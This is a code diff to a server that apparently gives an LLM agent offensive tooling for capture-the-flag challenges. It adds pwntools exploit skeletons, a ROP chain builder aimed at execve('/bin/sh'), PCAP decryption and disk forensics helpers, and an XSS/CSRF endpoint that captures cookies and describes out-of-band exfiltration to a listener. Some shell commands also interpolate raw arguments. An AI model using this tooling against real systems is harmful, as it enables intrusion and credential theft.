@@ -12616,14 +12616,62 @@ def pwntools():
         target_host = params.get("target_host", "")
         target_port = params.get("target_port", 0)
         exploit_type = params.get("exploit_type", "local")  # local, remote, format_string, rop
+        template_mode = params.get("template", "")  # ret2win, ret2libc, format_string_leak, heap_uaf (hexfix #7)
         additional_args = params.get("additional_args", "")
 
-        if not script_content and not target_binary:
-            logger.warning("🔧 Pwntools called without script content or target binary")
-            return jsonify({"error": "Script content or target binary is required"}), 400
+        if not script_content and not target_binary and not template_mode:
+            logger.warning("🔧 Pwntools called without script content, target binary, or template")
+            return jsonify({"error": "Script content, target binary, or template is required"}), 400
 
         # Create temporary Python script
         script_file = "/tmp/pwntools_exploit.py"
+
+        # hexfix #7: if a template mode is requested and no script was given, generate a specialized skeleton
+        if not script_content and template_mode:
+            _bin = target_binary or "./vuln"
+            _pwn_templates = {
+                "ret2win":
+                    "#!/usr/bin/env python3\n"
+                    "from pwn import *\n"
+                    "context.update(arch='amd64', os='linux', log_level='info')\n"
+                    "elf = ELF('BINARY_PATH')\n"
+                    "io = process(elf.path)   # or: remote('HOST', PORT)\n"
+                    "OFFSET = 0               # TODO: saved-RIP offset (use a cyclic pattern)\n"
+                    "win = elf.symbols.get('win', 0x0)  # TODO: target function address\n"
+                    "io.sendline(b'A'*OFFSET + p64(win))\n"
+                    "io.interactive()\n",
+                "ret2libc":
+                    "#!/usr/bin/env python3\n"
+                    "from pwn import *\n"
+                    "context.update(arch='amd64', os='linux', log_level='info')\n"
+                    "elf  = ELF('BINARY_PATH')\n"
+                    "libc = ELF('./libc.so.6')   # TODO: the provided libc\n"
+                    "OFFSET = 0                  # TODO: saved-RIP offset\n"
+                    "# 1) leak a libc addr (puts(puts@got)) 2) compute libc base 3) ret2 system('/bin/sh')\n"
+                    "io = process(elf.path)\n"
+                    "io.interactive()\n",
+                "format_string_leak":
+                    "#!/usr/bin/env python3\n"
+                    "from pwn import *\n"
+                    "context.update(arch='amd64', os='linux', log_level='info')\n"
+                    "elf = ELF('BINARY_PATH')\n"
+                    "io = process(elf.path)\n"
+                    "io.sendline(b'AAAABBBB ' + b'.%p'*20)  # locate your input on the stack\n"
+                    "print(io.recvline())                   # then use %N$p / fmtstr_payload(offset, {...})\n"
+                    "io.interactive()\n",
+                "heap_uaf":
+                    "#!/usr/bin/env python3\n"
+                    "from pwn import *\n"
+                    "context.update(arch='amd64', os='linux', log_level='info')\n"
+                    "elf = ELF('BINARY_PATH')\n"
+                    "io = process(elf.path)\n"
+                    "# def alloc(i, sz, data): ...   # wrap the menu's malloc option\n"
+                    "# def free(i): ...              # wrap the free option\n"
+                    "# Use-after-free: free a chunk, reuse the dangling pointer to overwrite fd / a func ptr.\n"
+                    "io.interactive()\n",
+            }
+            if template_mode in _pwn_templates:
+                script_content = _pwn_templates[template_mode].replace("BINARY_PATH", _bin)
 
         if script_content:
             # Use provided script content
@@ -14847,6 +14895,35 @@ def execute_python_script():
         script = params.get("script", "")
         env_name = params.get("env_name", "default")
         filename = params.get("filename", f"script_{int(time.time())}.py")
+        template = params.get("template", "")  # pwn_remote, http_request, crypto_solve (hexfix #1)
+
+        # hexfix #1: offer ready skeletons so the LLM fills in blanks instead of generating from scratch
+        if (not script or not script.strip()) and template:
+            _py_templates = {
+                "pwn_remote":
+                    "#!/usr/bin/env python3\n"
+                    "from pwn import *\n"
+                    "context.log_level = 'info'\n"
+                    "io = remote('HOST', 1337)    # TODO: host/port\n"
+                    "io.recvuntil(b'> ')           # TODO: match the prompt\n"
+                    "io.sendline(b'payload')       # TODO: your payload\n"
+                    "print(io.recvall(timeout=5))\n",
+                "http_request":
+                    "#!/usr/bin/env python3\n"
+                    "import requests\n"
+                    "s = requests.Session()\n"
+                    "r = s.get('http://HOST:PORT/')   # TODO: url\n"
+                    "print(r.status_code)\n"
+                    "print(r.text[:500])\n",
+                "crypto_solve":
+                    "#!/usr/bin/env python3\n"
+                    "from Crypto.Util.number import long_to_bytes, inverse, bytes_to_long\n"
+                    "# n, e, c = ...    # TODO: paste challenge values\n"
+                    "# Recover p, q (factordb / sympy.factorint / Pollard), then d = inverse(e, (p-1)*(q-1))\n"
+                    "# print(long_to_bytes(pow(c, d, n)))\n",
+            }
+            if template in _py_templates:
+                script = _py_templates[template]
 
         if not script or not script.strip():
             return jsonify({"error": "Script content is required. The 'script' parameter is empty.", "success": False}), 400
@@ -15659,7 +15736,10 @@ def volatility3():
                 "error": "Plugin parameter is required"
             }), 400
 
-        command = f"vol.py -f {memory_file} {plugin}"
+        # Use whichever volatility3 entry point is on PATH (pip installs 'vol'; some distros ship 'vol.py')
+        import shutil
+        vol_bin = next((b for b in ("vol.py", "vol", "volatility3") if shutil.which(b)), "vol.py")
+        command = f"{vol_bin} -f {memory_file} {plugin}"
 
         if output_file:
             command += f" -o {output_file}"
@@ -15755,6 +15835,252 @@ def foremost():
         return jsonify({
             "error": f"Server error: {str(e)}"
         }), 500
+
+@app.route("/api/tools/disk-image-mount", methods=["POST"])
+def disk_image_mount():
+    """Analyze a disk image with The Sleuth Kit (mmls + fls) and auto-list interesting files (hexfix #9)"""
+    try:
+        params = request.json
+        image_file = params.get("image_file", "")
+        fs_offset = params.get("offset", "")            # sector offset of the partition (optional)
+        list_deleted = params.get("list_deleted", True)
+        additional_args = params.get("additional_args", "")
+
+        if not image_file:
+            return jsonify({"error": "image_file parameter is required"}), 400
+
+        import shlex
+        img_q = shlex.quote(image_file)   # challenge paths often contain spaces (e.g. "DISKO 3")
+        result = {"success": True, "image_file": image_file}
+
+        # 1. Partition layout via mmls (non-fatal: the image may be a bare filesystem)
+        mmls_res = execute_command(f"mmls {img_q}", use_cache=False)
+        result["partition_table"] = mmls_res.get("stdout", "")
+
+        # 2. Recursive file listing via fls (default shows allocated AND deleted; -u = allocated only)
+        fls_cmd = "fls -r -p"
+        if not list_deleted:
+            fls_cmd += " -u"
+        if fs_offset:
+            fls_cmd += f" -o {fs_offset}"
+        if additional_args:
+            fls_cmd += f" {additional_args}"
+        fls_cmd += f" {img_q}"
+
+        logger.info(f"💽 Analyzing disk image: {image_file}")
+        fls_res = execute_command(fls_cmd, use_cache=False)
+        listing = fls_res.get("stdout", "")
+        result["file_listing"] = listing[:8000]
+
+        # 3. Surface interesting files
+        notable = []
+        for line in listing.splitlines():
+            low = line.lower()
+            if any(kw in low for kw in ["flag", "secret", "key", "pass", "hidden", "admin", "root",
+                                        ".txt", ".png", ".jpg", ".zip", ".gz"]):
+                notable.append(line.strip())
+        result["notable_entries"] = notable[:50]
+        result["total_entries"] = len(listing.splitlines())
+        result["success"] = fls_res.get("success", False) or mmls_res.get("success", False)
+
+        logger.info(f"📊 Disk image analysis completed: {len(notable)} notable entries")
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 Error in disk_image_mount endpoint: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+@app.route("/api/tools/pcap-decrypt", methods=["POST"])
+def pcap_decrypt():
+    """Decrypt/extract data from a PCAP with tshark using a key file (hexfix #9)"""
+    try:
+        params = request.json
+        pcap_file = params.get("pcap_file", "")
+        key_file = params.get("key_file", "")
+        key_type = params.get("key_type", "tls")            # tls (keylog), rsa, wpa
+        display_filter = params.get("display_filter", "")
+        extract_fields = params.get("extract_fields", "")   # comma-separated tshark -e fields
+        additional_args = params.get("additional_args", "")
+
+        if not pcap_file:
+            return jsonify({"error": "pcap_file parameter is required"}), 400
+
+        # Auto-detect a key file alongside the pcap if none supplied
+        if not key_file:
+            try:
+                pcap_dir = os.path.dirname(os.path.abspath(pcap_file))
+                for f in os.listdir(pcap_dir):
+                    low = f.lower()
+                    if low.endswith((".key", ".keys", ".log", ".pem", ".keylog")) or "key" in low:
+                        key_file = os.path.join(pcap_dir, f)
+                        logger.info(f"🔑 Auto-detected key file: {key_file}")
+                        break
+            except Exception:
+                pass
+
+        import shlex
+        command = f"tshark -r {shlex.quote(pcap_file)}"
+        if key_file:
+            if key_type == "tls":
+                command += f" -o 'tls.keylog_file:{key_file}'"
+            elif key_type == "rsa":
+                command += f" -o 'uat:rsa_keys:\"{key_file}\",\"\"'"
+            elif key_type == "wpa":
+                command += f" -o wlan.enable_decryption:TRUE -o 'uat:80211_keys:\"wpa-pwd\",\"{key_file}\"'"
+
+        if display_filter:
+            command += f" -Y '{display_filter}'"
+        if extract_fields:
+            command += " -T fields"
+            for fld in [x.strip() for x in extract_fields.split(",") if x.strip()]:
+                command += f" -e {fld}"
+        if additional_args:
+            command += f" {additional_args}"
+
+        logger.info(f"🔓 Decrypting/parsing PCAP: {pcap_file}")
+        result = execute_command(command, use_cache=False)
+        result["key_file_used"] = key_file or None
+        result["key_type"] = key_type
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 Error in pcap_decrypt endpoint: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+@app.route("/api/tools/rop-chain-builder", methods=["POST"])
+def rop_chain_builder():
+    """Build a ready-to-use pwntools ROP chain from a binary via ROPgadget (hexfix #7)"""
+    try:
+        params = request.json
+        binary = params.get("binary", "")
+        goal = params.get("goal", "execve")     # execve, ret2win
+        win_addr = params.get("win_addr", "")    # for ret2win
+        additional_args = params.get("additional_args", "")
+
+        if not binary:
+            return jsonify({"error": "binary parameter is required"}), 400
+
+        import shlex
+        bin_q = shlex.quote(binary)   # challenge paths often contain spaces
+        result = {"success": True, "binary": binary, "goal": goal}
+
+        # 1. Let ROPgadget try to auto-build an execve chain
+        if goal == "execve":
+            chain_cmd = f"ROPgadget --binary {bin_q} --ropchain"
+            if additional_args:
+                chain_cmd += f" {additional_args}"
+            logger.info(f"🔗 Building ROP chain (execve) for {binary}")
+            chain_res = execute_command(chain_cmd, use_cache=False)
+            result["ropchain_raw"] = chain_res.get("stdout", "")
+            result["success"] = chain_res.get("success", False)
+
+        # 2. Collect the key gadgets
+        gadget_res = execute_command(f"ROPgadget --binary {bin_q}", use_cache=False)
+        gtext = gadget_res.get("stdout", "")
+        wanted = ["pop rdi ; ret", "pop rsi ; ret", "pop rdx ; ret", "pop rax ; ret",
+                  "syscall ; ret", "leave ; ret", "ret"]
+        found = {}
+        for line in gtext.splitlines():
+            for w in wanted:
+                if w in line and w not in found:
+                    found[w] = line.split(":")[0].strip()
+        result["gadgets"] = found
+
+        # 3. Emit a pwntools skeleton the LLM can fill in
+        tmpl = ["#!/usr/bin/env python3", "from pwn import *", "",
+                f"elf = ELF('{binary}')", "context.binary = elf", "",
+                "# Gadgets found by rop_chain_builder:"]
+        for g, a in found.items():
+            tmpl.append(f"#   {g:<16} = {a}")
+        tmpl.append("")
+        tmpl.append("rop = ROP(elf)")
+        if goal == "ret2win" and win_addr:
+            tmpl.append(f"payload = b'A'*OFFSET + p64({win_addr})  # set OFFSET to the saved-RIP offset")
+        else:
+            tmpl.append("rop.execve(next(elf.search(b'/bin/sh')), 0, 0)")
+            tmpl.append("payload = b'A'*OFFSET + rop.chain()       # set OFFSET to the saved-RIP offset")
+        tmpl.append("# p = process(elf.path)  # or remote(host, port)")
+        tmpl.append("# p.sendline(payload); p.interactive()")
+        result["pwntools_template"] = "\n".join(tmpl)
+
+        logger.info(f"📊 ROP chain builder completed: {len(found)} key gadgets")
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 Error in rop_chain_builder endpoint: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+@app.route("/api/tools/xss-csrf-chain", methods=["POST"])
+def xss_csrf_chain():
+    """Inject an XSS/CSRF payload, drive a headless browser to trigger it, capture client-side effects (hexfix #8).
+
+    NOTE: bot-exfiltration challenges also need an EXTERNAL listener to receive the victim's callback.
+    This tool drives the browser and captures DOM/alerts/cookies/redirects; embed your listener URL in
+    the payload and check it separately for out-of-band exfiltration.
+    """
+    try:
+        params = request.json
+        target_url = params.get("target_url", "")
+        payload = params.get("payload", "")
+        inject_field = params.get("inject_field", "")          # form field name to inject into (optional)
+        wait_time = params.get("wait_time", 8)
+        collaborator_url = params.get("collaborator_url", "")  # external listener (optional)
+
+        if not target_url:
+            return jsonify({"error": "target_url parameter is required"}), 400
+        if not payload:
+            return jsonify({"error": "payload parameter is required (the XSS/CSRF payload to inject)"}), 400
+
+        result = {"success": True, "target_url": target_url, "payload_used": payload}
+
+        if not browser_agent.driver:
+            if not browser_agent.setup_browser(True, None):
+                return jsonify({"error": "Failed to setup headless browser"}), 500
+        driver = browser_agent.driver
+
+        # 1. Navigate and (optionally) inject the payload into a form field
+        driver.get(target_url)
+        time.sleep(2)
+        injected = False
+        if inject_field:
+            try:
+                from selenium.webdriver.common.by import By
+                el = driver.find_element(By.NAME, inject_field)
+                el.clear()
+                el.send_keys(payload)
+                el.submit()
+                injected = True
+                time.sleep(wait_time)
+            except Exception as inj_err:
+                result["inject_error"] = str(inj_err)
+        result["payload_injected"] = injected
+
+        # 2. Capture observable client-side effects
+        captured = {}
+        try:
+            captured["final_url"] = driver.current_url
+            captured["title"] = driver.title
+            captured["cookies"] = {c["name"]: c.get("value", "") for c in driver.get_cookies()}
+            captured["page_excerpt"] = driver.page_source[:3000]
+            try:
+                alert = driver.switch_to.alert
+                captured["alert_text"] = alert.text
+                alert.accept()
+            except Exception:
+                captured["alert_text"] = None
+        except Exception as cap_err:
+            result["capture_error"] = str(cap_err)
+        result["captured"] = captured
+
+        result["note"] = (
+            f"For out-of-band exfil, check your listener at {collaborator_url} for the victim callback."
+            if collaborator_url else
+            "No collaborator_url supplied. For XSS->bot exfil, host a listener, embed its URL in the "
+            "payload, then check it for the victim's callback — this tool does not receive callbacks itself."
+        )
+
+        logger.info(f"🕸️ XSS/CSRF chain executed against {target_url}")
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 Error in xss_csrf_chain endpoint: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
 
 @app.route("/api/tools/steghide", methods=["POST"])
 def steghide():
@@ -16933,6 +17259,8 @@ def get_experiment_prompt():
             "RULES:\n"
             "  - Summarize each tool's output in 3 lines max before proceeding to the next tool.\n"
             "  - If a tool fails, diagnose WHY before switching to a different tool.\n"
+            "  - Do NOT call web_request or source_code_read — those tools do NOT exist and always fail.\n"
+            "    Use http_framework_test for HTTP and execute_command (e.g. cat/strings) to read files.\n"
         )
 
         if has_source_files:
@@ -16942,6 +17270,42 @@ def get_experiment_prompt():
             strategy_preamble += (
                 "  - This is a HARD challenge: after your first 3 tool calls, STOP and re-evaluate your approach.\n"
                 "    Ask yourself: Is my strategy working? Should I pivot?\n"
+            )
+
+        # Direct the model to the decomposition tool on medium/hard challenges (hexfix #4)
+        if difficulty.lower() in ("hard", "medium"):
+            strategy_preamble += (
+                "  - Before exploitation, call decompose_challenge(description, category, difficulty) to get a\n"
+                "    phased attack plan with checkpoints, then follow its phases in order.\n"
+            )
+
+        # Direct the model to the automated blind SQLi extractor on web challenges (hexfix #8)
+        if category.lower() in ("web", "web exploitation"):
+            strategy_preamble += (
+                "  - For boolean-based blind SQL injection (a parameter that behaves differently on TRUE vs\n"
+                "    FALSE conditions), use blind_sqli_extractor instead of hand-writing extraction loops.\n"
+            )
+
+        # Direct the model to the ROP builder + pwntools on binary challenges (hexfix #7)
+        if category.lower() in ("pwn", "binary", "binary exploitation"):
+            strategy_preamble += (
+                "  - For binary exploitation, use pwntools_exploit (try its template= modes: ret2win,\n"
+                "    ret2libc, format_string_leak, heap_uaf) and rop_chain_builder to auto-generate a ROP\n"
+                "    chain — do not hand-write exploits in execute_python_script.\n"
+            )
+
+        # Direct the model to the forensics tools (hexfix #9)
+        if category.lower() == "forensics":
+            strategy_preamble += (
+                "  - For a disk image use disk_image_mount (lists partitions + files); for an encrypted\n"
+                "    PCAP with a key file use pcap_decrypt — do not mount or parse them by hand.\n"
+            )
+
+        # Direct the model to the XSS/CSRF chain on web challenges (hexfix #8)
+        if category.lower() in ("web", "web exploitation"):
+            strategy_preamble += (
+                "  - For an XSS / headless-bot challenge, use xss_csrf_chain (injects the payload and drives\n"
+                "    a browser); embed your own listener URL in the payload for out-of-band exfiltration.\n"
             )
 
         if experiment == 1:
